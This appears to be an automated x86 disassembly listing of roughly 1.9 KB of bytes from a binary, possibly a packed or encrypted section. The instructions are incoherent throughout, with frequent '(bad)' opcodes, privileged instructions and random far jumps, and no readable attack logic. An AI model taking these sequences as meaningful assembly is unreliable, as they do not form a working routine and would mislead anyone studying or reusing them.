  40b415:	neg    BYTE PTR [edi+0x47abae21]
  40b41b:	scas   eax,DWORD PTR es:[edi]
  40b41c:	mov    edi,0x8ad40391
  40b421:	dec    esp
  40b422:	(bad)  
  40b423:	stc    
  40b424:	add    eax,DWORD PTR [edi]
  40b426:	inc    dl
  40b428:	mov    ss,WORD PTR [edi+edx*2]
  40b42b:	and    al,BYTE PTR [ecx+0x73]
  40b42e:	add    DWORD PTR [edx],edx
  40b430:	lods   eax,DWORD PTR ds:[esi]
  40b431:	pop    edi
  40b432:	mov    al,ds:0xfc9744e
  40b437:	ins    DWORD PTR es:[edi],dx
  40b438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b43a:	sbb    eax,0xa9822742
  40b43f:	and    al,0x52
  40b441:	les    edx,FWORD PTR [edi]
  40b443:	mov    edx,0xdb0a4368
  40b448:	fldcw  WORD PTR [ecx]
  40b44a:	mov    al,0xdf
  40b44c:	retf   
  40b44d:	xchg   edi,eax
  40b44e:	mov    si,0xc7c
  40b452:	enter  0xf776,0x56
  40b456:	xor    DWORD PTR [ecx-0x6190c3b9],0xb4e803fd
  40b460:	push   esp
  40b461:	shr    DWORD PTR [edi],cl
  40b463:	mov    eax,ds:0x123056ba
  40b468:	fcomp  DWORD PTR [eax+edi*8]
  40b46b:	cmp    DWORD PTR [ebx+ebx*8-0x2a938fe5],esi
  40b472:	sub    ebp,DWORD PTR ss:[esp+ecx*2]
  40b476:	xor    esi,DWORD PTR [edi-0x268949b9]
  40b47c:	shr    DWORD PTR [ebp-0x20],0x67
  40b480:	not    edx
  40b482:	(bad)  
  40b483:	rcl    ah,1
  40b485:	mov    ah,0xbb
  40b487:	xchg   DWORD PTR [ebp+0x6f54a3f4],esp
  40b48d:	loope  0x40b437
  40b48f:	je     0x40b41b
  40b491:	outs   dx,DWORD PTR ds:[esi]
  40b492:	jmp    0x40b501
  40b494:	dec    ecx
  40b495:	jbe    0x40b4ab
  40b497:	loope  0x40b41b
  40b499:	xor    eax,0xd527d517
  40b49e:	add    eax,0x1f6fa0d9
  40b4a3:	mov    edi,0x27b339eb
  40b4a8:	shl    BYTE PTR [edx],1
  40b4aa:	jb     0x40b50e
  40b4ac:	cs es pusha 
  40b4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4b0:	fs jp  0x40b51f
  40b4b3:	popf   
  40b4b4:	dec    esi
  40b4b5:	mov    BYTE PTR [ebx-0x25],cl
  40b4b8:	inc    edi
  40b4b9:	fld    TBYTE PTR [edi-0x1a]
  40b4bc:	jb     0x40b534
  40b4be:	cwde   
  40b4bf:	dec    ebp
  40b4c0:	inc    esi
  40b4c1:	sbb    ch,BYTE PTR [esi]
  40b4c3:	jnp    0x40b4b2
  40b4c5:	xor    DWORD PTR [ecx-0x73faa8d0],ebp
  40b4cb:	and    eax,0xbde7aa22
  40b4d0:	push   edx
  40b4d1:	cmp    eax,DWORD PTR [eax+0x450051f8]
  40b4d7:	lds    ebp,FWORD PTR ds:0x9047145b
  40b4dd:	jnp    0x40b4c4
  40b4df:	inc    esp
  40b4e0:	xchg   esp,eax
  40b4e1:	pop    esp
  40b4e2:	xchg   esp,eax
  40b4e3:	mov    bh,0xac
  40b4e5:	jne    0x40b4ac
  40b4e7:	push   edi
  40b4e8:	pop    esp
  40b4e9:	out    dx,eax
  40b4ea:	(bad)  
  40b4eb:	xor    eax,0xa1c5601d
  40b4f0:	push   ss
  40b4f1:	out    0x90,eax
  40b4f3:	pop    edx
  40b4f4:	xor    BYTE PTR [esi],ch
  40b4f6:	imul   ebx,DWORD PTR [eax],0x92e5f04e
  40b4fc:	push   edi
  40b4fd:	push   es
  40b4fe:	daa    
  40b4ff:	(bad)  
  40b500:	imul   ebp,edi,0x1f
  40b503:	mov    ch,0x79
  40b505:	lea    edx,[ecx+0x6ad7488a]
  40b50b:	cmp    eax,0xfdb45f4d
  40b510:	jl     0x40b4d0
  40b512:	pop    edi
  40b513:	mov    dl,0xfb
  40b515:	pause  
  40b517:	or     DWORD PTR [eax+0x37f7a593],edx
  40b51d:	push   edi
  40b51e:	sub    ebp,DWORD PTR [edx-0x44]
  40b521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b522:	fsub   st,st(7)
  40b524:	mov    DWORD PTR [edx],edx
  40b526:	test   BYTE PTR [ecx+0xb8c97c3],ah
  40b52c:	mov    eax,0xfca25dcd
  40b531:	and    eax,0x667c9172
  40b536:	sbb    DWORD PTR [edx+0x1],eax
  40b539:	mov    eax,ds:0xd91b68ae
  40b53e:	(bad)  
  40b540:	inc    esp
  40b541:	hlt    
  40b542:	mov    eax,0x5886959b
  40b547:	stos   BYTE PTR es:[edi],al
  40b548:	mov    ebx,cr7
  40b54b:	fadd   st,st(7)
  40b54d:	aam    0x87
  40b54f:	cmp    edx,ecx
  40b551:	adc    BYTE PTR [esi+0x687b18d5],dl
  40b557:	mov    ah,0x1a
  40b559:	cmp    dh,BYTE PTR [ecx+esi*8]
  40b55c:	fiadd  WORD PTR [eax-0x480fbb5c]
  40b562:	mov    ebx,0x38df315f
  40b567:	or     eax,0x35f321bf
  40b56c:	push   0x26b31842
  40b571:	or     eax,0xcea9bcd5
  40b576:	arpl   WORD PTR [ebx+edi*8+0x42b04743],dx
  40b57d:	push   esi
  40b57e:	pushf  
  40b57f:	fst    st(1)
  40b581:	xor    DWORD PTR [ebx+0x5a],esp
  40b584:	dec    esp
  40b585:	fwait
  40b586:	mov    edx,0x2425a3c4
  40b58b:	dec    eax
  40b58c:	in     al,dx
  40b58d:	push   0xffffffb1
  40b58f:	into   
  40b590:	or     al,0x76
  40b592:	mov    eax,0xaa62ddd1
  40b597:	jnp    0x40b592
  40b599:	mov    ds:0x26906c21,al
  40b59e:	adc    eax,0xd911b13f
  40b5a3:	jl     0x40b588
  40b5a5:	push   eax
  40b5a6:	addr16 sbb bh,0x90
  40b5aa:	adc    eax,0x5962d517
  40b5af:	not    DWORD PTR ds:0x1d0fa2f2
  40b5b5:	inc    edx
  40b5b6:	sub    BYTE PTR [eax+0x2a],bh
  40b5b9:	or     ch,BYTE PTR [eax]
  40b5bb:	push   0x1c
  40b5bd:	pop    ecx
  40b5be:	or     ecx,eax
  40b5c0:	cmp    ebp,DWORD PTR [edi]
  40b5c2:	(bad)  
  40b5c3:	cs (bad) 
  40b5c5:	sbb    ebx,esp
  40b5c7:	cmp    BYTE PTR [ebx],0x94
  40b5ca:	fadd   DWORD PTR [ebx+0x38]
  40b5cd:	js     0x40b626
  40b5cf:	leave  
  40b5d0:	pushf  
  40b5d1:	or     DWORD PTR [edx-0x1a9e0a95],esp
  40b5d7:	xor    BYTE PTR [edx],dl
  40b5d9:	popa   
  40b5da:	add    DWORD PTR [esi+0x79039e93],ebp
  40b5e0:	mov    eax,ds:0x4437402f
  40b5e5:	arpl   WORD PTR ds:0xc6413a36,dx
  40b5eb:	mov    edi,0x4cf64329
  40b5f0:	psubb  mm2,QWORD PTR [esi+edi*1-0x42]
  40b5f5:	mov    esp,ss
  40b5f7:	lods   al,BYTE PTR ds:[esi]
  40b5f8:	(bad)
  40b5fb:	xor    eax,0xb6a43bb5
  40b600:	and    DWORD PTR [ecx+0x594defff],0xfffffff4
  40b607:	xor    eax,0x1f053295
  40b60c:	outs   dx,DWORD PTR ds:[esi]
  40b60d:	inc    esp
  40b60e:	cmc    
  40b60f:	jne    0x40b667
  40b611:	addr16 gs jle 0x40b5cd
  40b615:	pop    ds
  40b616:	cli    
  40b617:	clc    
  40b618:	test   DWORD PTR [ebp-0x3],0xdb979487
  40b61f:	out    dx,al
  40b620:	in     eax,dx
  40b621:	push   ebp
  40b622:	in     al,dx
  40b623:	shl    BYTE PTR [eax],1
  40b625:	dec    edi
  40b626:	gs scas eax,DWORD PTR es:[edi]
  40b628:	retf   0x34af
  40b62b:	push   ss
  40b62c:	not    DWORD PTR [edx+0x766e6305]
  40b632:	rcl    ecx,0x5a
  40b635:	icebp  
  40b636:	shr    BYTE PTR [eax-0x2dd5f817],1
  40b63c:	fistp  DWORD PTR [ebp+0x5bf09d41]
  40b642:	mov    esp,0x73295704
  40b647:	pusha  
  40b648:	jne    0x40b5e9
  40b64a:	fild   WORD PTR [edx-0x3e57caea]
  40b650:	pusha  
  40b651:	test   ax,0xa544
  40b655:	jo     0x40b65f
  40b657:	scas   al,BYTE PTR es:[edi]
  40b658:	inc    eax
  40b659:	jno    0x40b5f5
  40b65b:	and    dh,cl
  40b65d:	je     0x40b637
  40b65f:	mov    dl,0x26
  40b661:	repnz aad 0x35
  40b664:	jmp    0xc78b:0x5cdfcd4b
  40b66b:	dec    ecx
  40b66c:	mov    eax,0x625ab847
  40b671:	and    bl,dl
  40b673:	jg     0x40b682
  40b675:	pop    edi
  40b676:	xchg   edx,eax
  40b677:	sub    BYTE PTR [ebx-0x3c14677f],cl
  40b67d:	or     bh,bl
  40b67f:	and    al,0x6b
  40b681:	cmp    DWORD PTR [ecx+0x1],0xffffffbb
  40b685:	mov    esi,0xf6e114fa
  40b68a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b68b:	ins    DWORD PTR es:[edi],dx
  40b68c:	punpcklwd mm0,DWORD PTR [esi+0x1e]
  40b690:	das    
  40b691:	fcomp  QWORD PTR [ebx]
  40b693:	icebp  
  40b694:	enter  0xaa2f,0x80
  40b698:	(bad)  [edx+ebp*2+0x54]
  40b69c:	sub    al,BYTE PTR [ecx]
  40b69e:	inc    BYTE PTR [edx]
  40b6a0:	fistp  QWORD PTR [eax]
  40b6a2:	and    BYTE PTR ss:[ebx+0x11],ch
  40b6a6:	add    al,0x5e
  40b6a8:	rcl    DWORD PTR [ebp-0x66],0x9a
  40b6ac:	jnp    0x40b701
  40b6ae:	je     0x40b6bb
  40b6b0:	cwde   
  40b6b1:	test   eax,0x963a78b7
  40b6b6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b8:	cdq    
  40b6b9:	rcr    DWORD PTR [edi],cl
  40b6bb:	xchg   edx,eax
  40b6bc:	push   ebp
  40b6bd:	lods   al,BYTE PTR ds:[esi]
  40b6be:	bnd jl 0x40b6be
  40b6c1:	xor    dh,BYTE PTR [ebx+edi*1-0x39]
  40b6c5:	cld    
  40b6c6:	icebp  
  40b6c7:	xchg   edi,ecx
  40b6c9:	xchg   esi,eax
  40b6ca:	xchg   ebx,eax
  40b6cb:	and    al,0x57
  40b6cd:	iret   
  40b6ce:	jmp    0x40b739
  40b6d0:	push   edi
  40b6d1:	mov    bh,0xa9
  40b6d3:	enter  0x179d,0x1e
  40b6d7:	jl     0x40b70c
  40b6d9:	ror    BYTE PTR [ebx],cl
  40b6db:	(bad)  
  40b6dc:	mov    ?,WORD PTR [edx]
  40b6de:	imul   ecx,esp,0x11
  40b6e1:	xchg   edi,eax
  40b6e2:	outs   dx,BYTE PTR ds:[esi]
  40b6e3:	cmp    al,0xc6
  40b6e5:	xor    BYTE PTR [ebx-0x1ff301fd],bl
  40b6eb:	dec    ebx
  40b6ec:	jmp    0x40b716
  40b6ee:	mov    edi,edx
  40b6f0:	xchg   ecx,eax
  40b6f1:	sbb    ch,BYTE PTR [eax]
  40b6f3:	ror    DWORD PTR [ebp-0x6e],1
  40b6f6:	sbb    DWORD PTR [edi],edx
  40b6f8:	jmp    0x1271:0x58b6b2cc
  40b6ff:	xor    ah,ch
  40b701:	in     eax,dx
  40b702:	inc    ebx
  40b703:	(bad)  [eax+ebp*4+0x4f]
  40b707:	fstp   TBYTE PTR [eax]
  40b709:	addr16 cmc 
  40b70b:	dec    ebp
  40b70c:	shl    dh,0xd0
  40b70f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b710:	inc    ebx
  40b711:	fisubr WORD PTR [edx+0x4fdf39b2]
  40b717:	aam    0x3d
  40b719:	or     DWORD PTR [ecx+0x67],edx
  40b71c:	ret    0x6252
  40b71f:	pop    ss
  40b720:	jp     0x40b6d1
  40b722:	xchg   ebp,eax
  40b723:	xchg   ecx,eax
  40b724:	imul   ebp,ebx,0x33161614
  40b72a:	int    0xe
  40b72c:	mov    es,WORD PTR [edx+edx*8-0x2034e2a6]
  40b733:	call   0xbb5a:0x98ca8e4a
  40b73a:	ror    eax,0x80
  40b73d:	mov    ah,0x5
  40b73f:	ret    0xfdd7
  40b742:	dec    esi
  40b743:	mov    eax,0xad4a95b0
  40b748:	scas   eax,DWORD PTR es:[edi]
  40b749:	sbb    al,0x56
  40b74b:	mov    ds:0xda8d040b,al
  40b750:	mov    ch,0xe9
  40b752:	push   ds
  40b753:	sbb    BYTE PTR [edi+0x588a8216],ah
  40b759:	ret    
  40b75a:	pushf  
  40b75b:	gs sub ecx,eax
  40b75e:	ss dec ecx
  40b760:	push   esp
  40b761:	pushf  
  40b762:	imul   esi,DWORD PTR ds:0x201a0db1,0x7718c31c
  40b76c:	aad    0x53
  40b76e:	mov    eax,ds:0x3f605186
  40b773:	test   DWORD PTR ds:0xde9da016,esi
  40b779:	(bad)  
  40b77b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b77c:	adc    al,0xb5
  40b77e:	jge    0x40b7d5
  40b780:	ret    0x9f21
  40b783:	cmp    BYTE PTR es:[ecx],ah
  40b786:	je     0x40b7c6
  40b788:	sar    DWORD PTR [ebx+0x51],cl
  40b78b:	lock (bad) 
  40b78d:	loopne 0x40b7a7
  40b78f:	enter  0x225f,0x5
  40b793:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b795:	repnz push edx
  40b797:	aaa    
  40b798:	lahf   
  40b799:	and    DWORD PTR [ecx+esi*8+0x77],esp
  40b79d:	sbb    edi,DWORD PTR [eax+0x6f716cd2]
  40b7a3:	jnp    0x40b7e2
  40b7a5:	mov    edi,0x3eccacaf
  40b7aa:	dec    edi
  40b7ab:	dec    edi
  40b7ac:	mov    edx,0x5ecf6cc
  40b7b1:	(bad)  
  40b7b2:	cwde   
  40b7b3:	lds    esi,FWORD PTR [ecx-0x8ea00ef]
  40b7b9:	xchg   ebp,eax
  40b7ba:	mov    dl,ah
  40b7bc:	outs   dx,BYTE PTR ds:[esi]
  40b7bd:	mov    edi,0x23b2c16f
  40b7c2:	push   es
  40b7c3:	inc    esp
  40b7c4:	retf   
  40b7c5:	adc    esi,DWORD PTR [ecx+0x35]
  40b7c8:	mov    esp,0xc2d36b76
  40b7cd:	fsubr  DWORD PTR [edx+0x25]
  40b7d0:	mov    ebp,0x467fc27c
  40b7d5:	cmp    al,0xbf
  40b7d7:	mov    ss,WORD PTR [ecx]
  40b7d9:	ret    
  40b7da:	jle    0x40b7f5
  40b7dc:	push   0x35
  40b7de:	pop    ecx
  40b7df:	idiv   ebx
  40b7e1:	out    dx,eax
  40b7e2:	lahf   
  40b7e3:	adc    DWORD PTR ds:0xaa412b54,eax
  40b7e9:	jb     0x40b7f3
  40b7eb:	sti    
  40b7ec:	mov    cl,0x92
  40b7ee:	(bad)  
  40b7ef:	aas    
  40b7f0:	mov    esi,0xbcddca1b
  40b7f5:	ficom  DWORD PTR [eax]
  40b7f7:	jmp    0x40b7d3
  40b7f9:	fisub  WORD PTR [ebp+0x7c]
  40b7fc:	shl    BYTE PTR [ecx],0x19
  40b7ff:	jno    0x40b791
  40b801:	and    BYTE PTR [ebp+0x0],ch
  40b804:	enter  0x3055,0x15
  40b808:	adc    al,0x68
  40b80a:	jno    0x40b7dc
  40b80c:	test   eax,0xb5e806ed
  40b811:	adc    al,dl
  40b813:	adc    ebp,DWORD PTR [ecx]
  40b815:	out    dx,al
  40b816:	lds    edx,FWORD PTR [edx+edi*2+0x3b]
  40b81a:	mov    BYTE PTR [edi+eiz*1-0x25],cl
  40b81e:	rcl    BYTE PTR [eax-0x60],1
  40b821:	sub    BYTE PTR [edi],al
  40b823:	mov    bl,0xe7
  40b825:	xchg   ebx,eax
  40b826:	mov    al,ds:0x423df7bb
  40b82b:	sbb    BYTE PTR [esi-0x3088340b],cl
  40b831:	pop    ebp
  40b832:	outs   dx,DWORD PTR ds:[esi]
  40b833:	aam    0x4e
  40b835:	jns    0x40b7db
  40b837:	pushf  
  40b838:	popf   
  40b839:	pop    esi
  40b83a:	icebp  
  40b83b:	cdq    
  40b83c:	inc    ebx
  40b83d:	mov    ds:0x392220a,eax
  40b842:	das    
  40b843:	xor    eax,0x851f375b
  40b848:	out    dx,eax
  40b849:	mov    es,WORD PTR [esi]
  40b84b:	ret    
  40b84c:	int    0x3d
  40b84e:	push   edx
  40b84f:	cmp    eax,0x5491c60
  40b854:	inc    edi
  40b855:	rol    DWORD PTR [esi-0x4e],1
  40b858:	inc    esi
  40b859:	dec    eax
  40b85a:	lods   al,BYTE PTR ds:[esi]
  40b85b:	jo     0x40b861
  40b85d:	mov    ah,bh
  40b85f:	fdiv   DWORD PTR [edx]
  40b861:	xor    esp,DWORD PTR [edx]
  40b863:	add    bh,BYTE PTR [ecx-0x24]
  40b866:	sbb    ebp,DWORD PTR [ecx+0x654dd1b3]
  40b86c:	push   eax
  40b86d:	leave  
  40b86e:	shl    DWORD PTR [edi-0x66],1
  40b871:	adc    DWORD PTR [ebx-0xbd0c0b4],edi
  40b877:	(bad)  
  40b878:	fst    DWORD PTR [ebp-0x303acbe]
  40b87e:	lods   eax,DWORD PTR ds:[esi]
  40b87f:	repnz fisubr DWORD PTR [edi-0x2630ff83]
  40b886:	imul   edi,edx,0xffffffcb
  40b889:	fistp  DWORD PTR [ebp-0x3a412872]
  40b88f:	pop    ebp
  40b890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b891:	adc    ecx,edi
  40b893:	mov    ds,WORD PTR [ecx-0x5a]
  40b896:	rcl    BYTE PTR [ecx],1
  40b898:	and    al,0x87
  40b89a:	int3   
  40b89b:	out    0x5b,eax
  40b89d:	dec    edx
  40b89e:	ror    cl,1
  40b8a0:	jecxz  0x40b8f2
  40b8a2:	xor    esi,esi
  40b8a4:	pop    ebp
  40b8a5:	scas   eax,DWORD PTR es:[edi]
  40b8a6:	stos   DWORD PTR es:[edi],eax
  40b8a7:	mov    ah,BYTE PTR [ecx]
  40b8a9:	call   0x2b3:0xbcab13fc
  40b8b0:	push   esp
  40b8b1:	fstp   TBYTE PTR [esp+esi*8-0x1412ca6c]
  40b8b8:	pop    ss
  40b8b9:	sbb    BYTE PTR [edx-0x2c9e6862],0x1d
  40b8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c1:	enter  0x219c,0x97
  40b8c5:	jmp    0x40b91c
  40b8c7:	test   eax,0x7efcc52b
  40b8cc:	sbb    bl,BYTE PTR [eax+ebp*8+0x4a]
  40b8d0:	and    DWORD PTR [ebp-0x5910888f],0xab10360f
  40b8da:	in     eax,dx
  40b8db:	mov    dh,0xf1
  40b8dd:	inc    edx
  40b8de:	mov    ah,BYTE PTR ds:0x634d2291
  40b8e4:	sub    bh,BYTE PTR [edi]
  40b8e6:	xor    bl,bh
  40b8e8:	mov    dl,0x10
  40b8ea:	xchg   ebp,eax
  40b8eb:	sub    DWORD PTR ds:0xd8e13946,ebx
  40b8f1:	pop    ebp
  40b8f2:	push   DWORD PTR [ecx+0x56de5f7a]
  40b8f8:	sbb    al,0x76
  40b8fa:	mov    BYTE PTR [ecx],bh
  40b8fc:	sbb    DWORD PTR [ebp+0x3a],ebp
  40b8ff:	cmp    ebx,DWORD PTR [esi+0x5a]
  40b902:	jo     0x40b8ef
  40b904:	int    0x52
  40b906:	rol    BYTE PTR [ebx-0x42],0x4c
  40b90a:	popf   
  40b90b:	lea    esp,[eax]
  40b90d:	inc    esp
  40b90e:	sbb    BYTE PTR [ebx],0x82
  40b911:	mov    bl,0xb8
  40b913:	and    ch,dl
  40b915:	adc    DWORD PTR ds:0xa4c8eac1,0xc1e3c3a5
  40b91f:	adc    al,0x93
  40b921:	sahf   
  40b922:	jne    0x40b964
  40b924:	clc    
  40b925:	push   ds
  40b926:	aas    
  40b927:	mov    dl,0xad
  40b92a:	sbb    al,0xdf
  40b92c:	pop    ebx
  40b92d:	fcomip st,st(5)
  40b92f:	hlt    
  40b930:	adc    al,0x8
  40b932:	or     DWORD PTR [eax],ebp
  40b934:	fwait
  40b935:	xchg   ebx,eax
  40b936:	add    DWORD PTR [edi-0x57c8e765],0x9f55b44d
  40b940:	rcr    al,1
  40b942:	mov    edi,0xb3ca92ef
  40b947:	(bad)  
  40b948:	mov    eax,0x9eb5a4af
  40b94d:	hlt    
  40b94e:	xor    BYTE PTR [ebx-0x4c16a357],ah
  40b954:	xor    dh,BYTE PTR [edx+edx*8-0x6aafbdba]
  40b95b:	xchg   ebx,eax
  40b95c:	stos   BYTE PTR es:[edi],al
  40b95d:	add    al,0x39
  40b95f:	push   ds
  40b960:	repnz loop 0x40b98b
  40b963:	test   bh,ch
  40b965:	or     DWORD PTR [eax],esp
  40b967:	mov    ds:0x8231d5b6,eax
  40b96c:	cmp    edi,DWORD PTR [edx+0x13]
  40b96f:	mov    ah,0x87
  40b971:	and    al,ch
  40b973:	out    0x9a,al
  40b975:	mov    ds,WORD PTR cs:[ebp+0x1cb358c1]
  40b97c:	(bad)  
  40b97d:	or     eax,0x9fb84a40
  40b982:	and    al,0x93
  40b984:	push   ecx
  40b985:	test   BYTE PTR [edi],ah
  40b987:	sbb    ah,BYTE PTR [eax+ebp*8-0x27]
  40b98b:	cmp    BYTE PTR [ebx-0x6b],0x40
  40b98f:	push   edx
  40b990:	call   0x8df0:0xe1d3481b
  40b997:	pop    ss
  40b998:	int    0x82
  40b99a:	push   0x3aa9556b
  40b99f:	dec    eax
  40b9a0:	(bad)  
  40b9a1:	ja     0x40b9bb
  40b9a3:	and    al,0xe0
  40b9a5:	cmp    BYTE PTR [edi-0x80],bl
  40b9a8:	repnz dec esp
  40b9aa:	fsub   DWORD PTR [eax+0x41748471]
  40b9b0:	push   0xe0c99f36
  40b9b5:	aas    
  40b9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b7:	shl    BYTE PTR [edi+0x13f6398d],1
  40b9bd:	xor    ecx,DWORD PTR [ecx+0x1b]
  40b9c0:	and    ebx,DWORD PTR [eax-0x80]
  40b9c3:	clc    
  40b9c4:	loop   0x40b95e
  40b9c6:	ror    bl,0xbb
  40b9c9:	push   es
  40b9ca:	lahf   
  40b9cb:	fnsave [eax-0x159e67b6]
  40b9d1:	inc    esi
  40b9d2:	inc    esp
  40b9d3:	sbb    DWORD PTR [edx+0x5e],0x43
  40b9d7:	push   esp
  40b9d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9d9:	scas   al,BYTE PTR es:[edi]
  40b9da:	(bad)  
  40b9db:	push   es
  40b9dc:	inc    ebp
  40b9dd:	jmp    0x3d70:0xed475b1b
  40b9e4:	ret    
  40b9e5:	scas   al,BYTE PTR es:[edi]
  40b9e6:	mov    DWORD PTR [eax-0xd],ebx
  40b9e9:	mov    esi,0x1c3f3ead
  40b9ee:	ins    DWORD PTR es:[edi],dx
  40b9ef:	sub    esi,DWORD PTR [edx]
  40b9f1:	(bad)  
  40b9f2:	mov    edi,0x749f73ad
  40b9f7:	or     BYTE PTR [esi-0x41],dh
  40b9fa:	mov    bh,0x40
  40b9fc:	add    BYTE PTR ds:0x8ed2785,ah
  40ba02:	push   ebx
  40ba03:	js     0x40b9c6
  40ba05:	ret    
  40ba06:	inc    edi
  40ba07:	mov    dl,0x39
  40ba09:	shl    edx,0x29
  40ba0c:	add    eax,0x92e729cc
  40ba11:	and    dh,al
  40ba13:	add    DWORD PTR [ecx-0x17],0x68f1b960
  40ba1a:	cld    
  40ba1b:	cs sbb cl,bh
  40ba1e:	in     al,0xa7
  40ba20:	pop    ebp
  40ba21:	aam    0x99
  40ba23:	jge    0x40b9fe
  40ba25:	movnti DWORD PTR [edi-0x4c5e069c],ebp
  40ba2c:	int3   
  40ba2d:	push   ebx
  40ba2e:	xchg   ebx,eax
  40ba2f:	xchg   ebx,eax
  40ba30:	xchg   DWORD PTR [edi],edx
  40ba32:	mov    edi,0xb32144fb
  40ba37:	js     0x40b9f3
  40ba39:	in     al,0x77
  40ba3b:	ss inc ebx
  40ba3d:	std    
  40ba3e:	stos   DWORD PTR es:[edi],eax
  40ba3f:	mov    esp,0x9af71a16
  40ba44:	pop    edi
  40ba45:	jbe    0x40ba7e
  40ba47:	fcomp  QWORD PTR [eax]
  40ba49:	nop
  40ba4a:	fsubr  DWORD PTR [edi+0x6d28377b]
  40ba50:	(bad)  [ecx+0x2b0b5228]
  40ba56:	push   edx
  40ba57:	mov    ecx,0xc6786bae
  40ba5c:	dec    edx
  40ba5d:	fdivr  QWORD PTR [eax+0x6e66c79d]
  40ba63:	jb     0x40ba16
  40ba65:	mov    esi,0xd2d066fd
  40ba6a:	fwait
  40ba6b:	sbb    DWORD PTR [edx+0x45],edx
  40ba6e:	out    0xb9,eax
  40ba70:	mov    bl,0x43
  40ba72:	push   ds
  40ba73:	out    dx,al
  40ba74:	scas   al,BYTE PTR es:[edi]
  40ba75:	dec    ebp
  40ba76:	cmp    dh,bh
  40ba78:	aaa    
  40ba79:	div    BYTE PTR [eax]
  40ba7b:	dec    esp
  40ba7c:	add    dh,BYTE PTR [eax+0x3]
  40ba7f:	inc    edx
  40ba80:	sub    al,0x56
  40ba82:	pop    ebx
  40ba83:	movsx  eax,WORD PTR [edi-0x59]
  40ba87:	test   eax,0x9449f584
  40ba8c:	xchg   esp,eax
  40ba8d:	mul    DWORD PTR [esi+edi*4]
  40ba90:	or     DWORD PTR [ecx],esp
  40ba92:	dec    ebx
  40ba93:	sbb    ebp,eax
  40ba95:	xor    BYTE PTR [esi+0x5013a73a],cl
  40ba9b:	sti    
  40ba9c:	pop    ds
  40ba9d:	mov    edi,0xd0d90583
  40baa2:	push   es
  40baa3:	lods   al,BYTE PTR ds:[esi]
  40baa4:	outs   dx,BYTE PTR ds:[esi]
  40baa5:	inc    esi
  40baa6:	std    
  40baa7:	rcr    esp,1
  40baa9:	adc    esp,DWORD PTR [esi+0x2c1b3c8a]
  40baaf:	push   ebx
  40bab0:	sub    al,0x39
  40bab2:	push   esi
  40bab3:	push   ebx
  40bab4:	popa   
  40bab5:	mov    esp,0x4eeec17c
  40baba:	add    edi,edx
  40babc:	fsub   st(5),st
  40babe:	cmp    cl,dh
  40bac0:	push   ecx
  40bac1:	adc    al,0x29
  40bac4:	inc    eax
  40bac5:	pop    esi
  40bac6:	pop    ecx
  40bac7:	dec    ebx
  40bac8:	dec    ebx
  40bac9:	and    BYTE PTR [eax-0x34],cl
  40bacc:	xchg   esp,eax
  40bacd:	sub    al,0x32
  40bacf:	and    al,0xda
  40bad1:	mov    dl,0xf9
  40bad3:	neg    BYTE PTR [ebx]
  40bad5:	aaa    
  40bad6:	jo     0x40baab
  40bad8:	loopne 0x40bb15
  40bada:	and    BYTE PTR [ebp+0x57],dl
  40badd:	pop    ebp
  40bade:	mov    ?,WORD PTR [ebp-0x38]
  40bae1:	jno    0x40bafb
  40bae3:	jmp    0x40bb34
  40bae5:	nop
  40bae6:	xor    edx,0xffffffcc
  40bae9:	mov    ch,0xd2
  40baeb:	or     BYTE PTR [edx+ecx*4-0x55],0xa8
  40baf0:	lds    eax,FWORD PTR [ebp-0x66]
  40baf3:	jmp    0xae6f1fca
  40baf8:	lock imul edx,DWORD PTR ds:0x8d7c0509,0xd3da36d
  40bb03:	cmp    eax,0x939501f5
  40bb08:	cld    
  40bb09:	lahf   
  40bb0a:	retf   
  40bb0b:	loop   0x40bb72
  40bb0d:	adc    cl,BYTE PTR [edx+0x4]
  40bb10:	pop    ss
  40bb11:	aam    0x1a
  40bb13:	nop
  40bb14:	sub    BYTE PTR [esi],cl
  40bb16:	mov    bl,BYTE PTR [edx+0x61595ef1]
  40bb1c:	jmp    0x40bb1b
  40bb1e:	mov    cl,0xaa
  40bb20:	outs   dx,BYTE PTR ds:[esi]
  40bb21:	bound  eax,QWORD PTR [edx]
  40bb23:	hlt    
  40bb24:	jg     0x2c43a660
  40bb2a:	retf   
  40bb2b:	sub    BYTE PTR [esi+ebp*2-0x8],dl
  40bb2f:	jp     0x40bb38
  40bb31:	imul   ebx,DWORD PTR [ebx+eiz*1+0x5c],0xd
  40bb36:	mov    ds:0xa684945b,al
  40bb3b:	sbb    ch,BYTE PTR [edi]
  40bb3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb3e:	sub    al,0x8a
  40bb40:	and    al,0x4a
  40bb42:	stos   DWORD PTR es:[edi],eax
  40bb43:	pop    esi
  40bb44:	mov    ebp,0xacefb88f
  40bb49:	or     BYTE PTR [ebp+0x41],ch
  40bb4c:	or     BYTE PTR [ecx-0x74],ch
  40bb4f:	imul   ecx,DWORD PTR [ebx],0xffffffab
  40bb52:	pop    edi
  40bb53:	fild   WORD PTR [ecx+0x3ed8dd73]
  40bb59:	xchg   BYTE PTR [edi+0x2a],dh
  40bb5c:	test   DWORD PTR [edx+0x4e72652],ebp
  40bb62:	or     BYTE PTR [eax+0x60edf18c],dh
  40bb68:	je     0x40bb85
  40bb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb6b:	or     eax,DWORD PTR [eax]
  40bb6d:	adc    ch,bl
  40bb6f:	int3   
  40bb70:	and    ebp,DWORD PTR [ebx]
  40bb72:	inc    ebx
  40bb73:	xchg   bh,dh
  40bb75:	push   eax
  40bb76:	and    BYTE PTR [esi-0x6e721eac],0xf0
  40bb7d:	ins    BYTE PTR es:[edi],dx
  40bb7e:	aas    
  40bb7f:	and    BYTE PTR [eax],dl
  40bb81:	xor    DWORD PTR [edx],ebp
  40bb83:	test   eax,0xb356f240
